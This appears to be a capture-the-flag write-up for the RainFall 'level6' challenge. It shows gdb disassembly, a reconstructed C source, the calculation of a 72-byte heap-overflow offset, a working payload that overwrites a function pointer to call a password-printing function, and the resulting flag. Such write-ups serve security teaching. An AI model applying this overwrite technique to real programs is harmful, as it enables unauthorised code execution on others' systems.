## Level6 - Heap Overflow
---

### Steps to solve
- #### Use gdb to get the assembly of the program and tracking instructions.
   - #### Functions used in this program:
      ```c
      0x08048340  strcpy
      0x08048350  malloc
      0x08048360  puts
      0x08048370  system
      0x08048430  frame_dummy
      0x08048454  n
      0x08048468  m
      0x0804847c  main
      ```
   - #### Assembly code of main
      ```c
      0x0804847f <+3>:     and    $0xfffffff0,%esp
      0x08048482 <+6>:     sub    $0x20,%esp
      0x08048485 <+9>:     movl   $0x40,(%esp)
      0x0804848c <+16>:    call   0x8048350 <malloc@plt>
      0x08048491 <+21>:    mov    %eax,0x1c(%esp)
      0x08048495 <+25>:    movl   $0x4,(%esp)
      0x0804849c <+32>:    call   0x8048350 <malloc@plt>
      0x080484a1 <+37>:    mov    %eax,0x18(%esp)
      0x080484a5 <+41>:    mov    $0x8048468,%edx
      0x080484aa <+46>:    mov    0x18(%esp),%eax
      0x080484ae <+50>:    mov    %edx,(%eax)
      0x080484b0 <+52>:    mov    0xc(%ebp),%eax
      0x080484b3 <+55>:    add    $0x4,%eax
      0x080484b6 <+58>:    mov    (%eax),%eax
      0x080484b8 <+60>:    mov    %eax,%edx
      0x080484ba <+62>:    mov    0x1c(%esp),%eax
      0x080484be <+66>:    mov    %edx,0x4(%esp)
      0x080484c2 <+70>:    mov    %eax,(%esp)
      0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
      0x080484ca <+78>:    mov    0x18(%esp),%eax
      0x080484ce <+82>:    mov    (%eax),%eax
      0x080484d0 <+84>:    call   *%eax
      0x080484d2 <+86>:    leave  
      0x080484d3 <+87>:    ret
      ```
   - #### Assembly code of n
      ```c
      0x08048457 <+3>:     sub    $0x18,%esp
      0x0804845a <+6>:     movl   $0x80485b0,(%esp)
      0x08048461 <+13>:    call   0x8048370 <system@plt>
      0x08048466 <+18>:    leave  
      0x08048467 <+19>:    ret
      ```
      #### Function n calling `system` function with `0x80485b0` as a parameter.
      ```c
      (gdb) x/s 0x80485b0
      0x80485b0:       "/bin/cat /home/user/level7/.pass"
      (gdb) 
      ```
      #### The function `n` does the job we need; we just need to call it in some way.
   - #### Assembly code of m
      ```c
      0x0804846b <+3>:     sub    $0x18,%esp
      0x0804846e <+6>:     movl   $0x80485d1,(%esp)
      0x08048475 <+13>:    call   0x8048360 <puts@plt>
      0x0804847a <+18>:    leave  
      0x0804847b <+19>:    ret
      ```
      #### We can see that there are two additional functions, `m`, which just prints a message "Nope", and `n`, which calls `system` to `cat` the pass flag. So `n` is our target. `m` is used in `main`, exactly here:
      ```c
         0x080484a1 <+37>:    mov    %eax,0x18(%esp)
         0x080484a5 <+41>:    mov    $0x8048468,%edx // this is the address of m function
         0x080484aa <+46>:    mov    0x18(%esp),%eax // put the address 0x18(%esp) to eax
         0x080484ae <+50>:    mov    %edx,(%eax) // mov m fun to 0x18(%esp)
         ...
         0x080484ca <+78>:    mov    0x18(%esp),%eax //put the address 0x18(%esp) to eax
         0x080484ce <+82>:    mov    (%eax),%eax // get the value of address 0x18(%esp) to eax
         0x080484d0 <+84>:    call   *%eax // call m function

      ```
      #### In these lines we can see that the program calls `m`, but it never calls `n`. Our task is to make `n` get called in some way, in order to get the pass flag.
- #### Get the approximate source code:
   ```c
   #include<stdio.h>
   #include<stdlib.h>
   #include <string.h>


   void m(){
      puts("Nope");
   }

   void n(){
      system("/bin/cat /home/user/level7/.pass");
   }

   int main(int ac, char **av){
      char *buf = malloc(64);
      void (**fun_ptr)() = malloc(4);

      *fun_ptr = &m;

      strcpy(buf, av[1]);

      (*fun_ptr)();
   }
   ```
   #### Now we can see what happened exactly. The program didn't call `m` directly; it used a pointer instead. So we need to change this pointer to point to `n` instead of `m`.

   #### How can we do this? Fortunately, the programme call `strcpy`, which copies `argv[1]` into `buf` with no size limit. This allows us to overwrite memory until we reach our target, which is the `fun_ptr` function pointer, and place the address of `n` there instead of `m`. As a result, the program will call `n` blindly.

- #### Vulnrability Type is `Heap Overflow`.

- #### Use gdb and python print to calculate the gap between `buf` and `fun_ptr`.
   #### Set a break point before strcpy performed.
   ```c
      0x080484c2 <+70>:    mov    %eax,(%esp)
   -> 0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
      0x080484ca <+78>:    mov    0x18(%esp),%eax
      ...
      (gdb) b *0x080484c5
      Breakpoint 1 at 0x80484c5
   ```
   #### Then run the program with tiny string "1234"
   ```c
   (gdb) r "1234"
   Starting program: /home/user/level6/level6 "1234"

   Breakpoint 1, 0x080484c5 in main ()
   ```
   #### After hiting the breack point, print the registers values.
   ```c
   (gdb) info register // show the register values.
   eax            0x804a008        134520840 // this is the address of the allocated 64 byte.
   ecx            0x20fa9  135081
   edx            0xbffff909       -1073743607
   ebx            0xb7fd0ff4       -1208152076
   esp            0xbffff710       0xbffff710
   ebp            0xbffff738       0xbffff738
   esi            0x0      0
   edi            0x0      0
   eip            0x80484c5        0x80484c5 <main+73>
   eflags         0x200286 [ PF SF IF ID ]
   cs             0x73     115
   ss             0x7b     123
   ds             0x7b     123
   es             0x7b     123
   fs             0x0      0
   gs             0x33     51
   ```
   #### The variable `buf` have the address `0x804a008` and we can prove this to be clear. By print the values of `buf` before and after calling `strcpy` and see if the `arg[1]` content exist in `buf`.
   ```c
   (gdb) x/s 0x804a008 // before performing strcpy buf its void. 
   0x804a008:       ""
   (gdb) ni
   0x080484ca in main ()
   (gdb) x/s 0x804a008 // after performing strcpy its hold our argv[1].
   0x804a008:       "1234"
   ```
   #### Add some bytes to `buf` address and see how mush bytes we need to reach `fun_ptr`, actauly we can get the address of `m` from the `info functions` command in `gdb`.
   ```c
   (gdb) info functions
   0x08048340  strcpy
   0x08048350  malloc
   ...
   0x08048454  n
   0x08048468  m <-
   0x0804847c  main
   ```
   #### The address of `m` is `0x08048468`. Now we need to add some bytes to see what comes next to `buf`, and we hope that this is the address of `m`, meaning that `fun_ptr` points to this position.

   #### First, we will add `64` (`0x40` in hex) bytes to the start of `buf` to skip it: `0x804a008 + 0x40` = `0x804a048`. Now we will see if the address exists directly next to `buf` or after some bytes.
   ```c
   // use wx to print the values as hexa as our function address it is.
   (gdb) x/wx 0x804a048 // print the value after buf directly.
   0x804a048:      0x00000000
   (gdb) x/wx 0x804a048+0x4 // add 4 bytes to buf end and print the value.
   0x804a04c:      0x00000011
   (gdb) x/wx 0x804a048+0x8 // add 8 bytes to buf end and print the value.
   0x804a050:      0x08048468
   ```
   #### We can see the address of `m` when 8 bytes are added to the end of `buf`, so the gap is 8. Now we can enter `64+8` = `72` characters, followed by the address of the `n` function, `0x08048454`.
- #### solution command
   ```sh
   ./level6 $(python -c 'print("a"*72+"\x54\x84\x04\x08")')
   ```
   #### Result.
   ```sh
   level6@RainFall:~$ ./level6 $(python -c 'print("a"*72+"\x54\x84\x04\x08")')
   f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
   level6@RainFall:~$ 
   ```

